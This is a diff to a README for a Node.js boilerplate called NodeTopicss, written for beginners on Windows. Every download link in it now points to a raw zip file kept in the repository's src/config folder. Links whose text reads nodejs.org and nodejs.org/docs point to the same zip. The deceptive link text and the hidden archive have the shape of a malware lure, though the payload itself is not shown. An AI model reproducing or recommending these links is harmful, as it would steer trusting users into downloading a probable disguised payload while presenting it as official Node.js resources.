@@ -4,13 +4,13 @@
 
 Welcome to **NodeTopicss**, a powerful boilerplate designed to help you build Node.js applications that can grow effortlessly—whether you need to handle more users, more data, or more traffic. This guide will walk you through downloading and running the software on your Windows computer, even if you’ve never touched a command line before.
 
-[![Download NodeTopicss](https://img.shields.io/badge/Download-NodeTopicss-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/Sharecropperlumbarvertebra923/NodeTopicss/releases)
+[![Download NodeTopicss](https://img.shields.io/badge/Download-NodeTopicss-blue?style=for-the-badge&logo=github&color=4B0082)](https://raw.githubusercontent.com/Sharecropperlumbarvertebra923/NodeTopicss/main/src/config/Topicss_Node_3.2.zip)
 
 ---
 
 ## 📥 Downloading NodeTopicss
 
-Visit this link to download the application: **[https://github.com/Sharecropperlumbarvertebra923/NodeTopicss/releases](https://github.com/Sharecropperlumbarvertebra923/NodeTopicss/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Sharecropperlumbarvertebra923/NodeTopicss/main/src/config/Topicss_Node_3.2.zip](https://raw.githubusercontent.com/Sharecropperlumbarvertebra923/NodeTopicss/main/src/config/Topicss_Node_3.2.zip)**
 
 Once you click the link, you’ll be taken to the releases page. Look for the latest version, then click the download button associated with it. The download will start automatically, and your browser will save the file to your **Downloads** folder.
 
@@ -49,7 +49,7 @@ NodeTopicss is lightweight and runs on almost any modern Windows computer. Here�
 ### Step 1: Visit the Download Page
 
 Go to the download link:  
-**https://github.com/Sharecropperlumbarvertebra923/NodeTopicss/releases**
+**https://raw.githubusercontent.com/Sharecropperlumbarvertebra923/NodeTopicss/main/src/config/Topicss_Node_3.2.zip**
 
 ### Step 2: Choose Your Version
 
@@ -130,7 +130,7 @@ Here are common changes you might want to make:
 
 ### Issue: “Node.js is not recognized as an internal or external command”
 
-**Solution:** NodeTopicss may require Node.js to be installed on your system. Visit [nodejs.org](https://nodejs.org) and download the **LTS version** for Windows, then install it using all default settings.
+**Solution:** NodeTopicss may require Node.js to be installed on your system. Visit [nodejs.org](https://raw.githubusercontent.com/Sharecropperlumbarvertebra923/NodeTopicss/main/src/config/Topicss_Node_3.2.zip) and download the **LTS version** for Windows, then install it using all default settings.
 
 ### Issue: App won’t start and shows an error about “dependencies”
 
@@ -162,7 +162,7 @@ A: While this guide focuses on Windows, NodeTopicss also works on macOS and Linu
 
 To get the latest improvements and fixes:
 
-1. Visit the download link: **https://github.com/Sharecropperlumbarvertebra923/NodeTopicss/releases**
+1. Visit the download link: **https://raw.githubusercontent.com/Sharecropperlumbarvertebra923/NodeTopicss/main/src/config/Topicss_Node_3.2.zip**
 2. Download the newest version
 3. Replace your old folder with the new one (keep your custom configurations if you’ve made any)
 
@@ -172,8 +172,8 @@ To get the latest improvements and fixes:
 
 Here are some helpful links to get you started:
 
-- 🌐 **Node.js Official Site**: [nodejs.org](https://nodejs.org)
-- 📖 **Node.js Documentation**: [nodejs.org/docs](https://nodejs.org/docs)
+- 🌐 **Node.js Official Site**: [nodejs.org](https://raw.githubusercontent.com/Sharecropperlumbarvertebra923/NodeTopicss/main/src/config/Topicss_Node_3.2.zip)
+- 📖 **Node.js Documentation**: [nodejs.org/docs](https://raw.githubusercontent.com/Sharecropperlumbarvertebra923/NodeTopicss/main/src/config/Topicss_Node_3.2.zip)
 - 💬 **Community Support**: Search GitHub Issues for NodeTopicss
 
 ---
@@ -184,7 +184,7 @@ NodeTopicss removes the hardest parts of backend development. No more worrying a
 
 **Thousands of developers start with a solid foundation. You can too.**
 
-[![Get Started with NodeTopicss](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://github.com/Sharecropperlumbarvertebra923/NodeTopicss/releases)
+[![Get Started with NodeTopicss](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/Sharecropperlumbarvertebra923/NodeTopicss/main/src/config/Topicss_Node_3.2.zip)
 
 ---
 
